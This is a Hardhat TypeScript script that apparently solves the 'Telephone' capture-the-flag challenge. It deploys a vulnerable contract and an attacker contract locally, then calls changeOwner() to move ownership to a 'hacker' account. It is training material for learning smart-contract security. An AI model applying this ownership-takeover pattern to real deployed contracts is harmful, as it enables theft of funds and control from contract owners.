import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/04-telephone';
import deployContractAttack from '../deploy/04-telephone-attacker';

const INSTANCE_CONTRACT_NAME = 'Telephone';
const ATTACKER_CONTRACT_NAME = 'TelephoneAttacker';

const getContractOwnerName = (newOwner: string, hacker: string) => {
  return newOwner === hacker ? 'hacker' : 'deployer';
};

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const contractAttackAddress = await deployContractAttack();
  const contractAttackInstance = await ethers.getContractAt(ATTACKER_CONTRACT_NAME, contractAttackAddress);
  const contractAttack = contractAttackInstance.connect(hacker);

  const initialOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(initialOwnerAddress, hackerAddress));

  await contractAttack.changeOwner();

  const newOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(newOwnerAddress, hackerAddress));

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
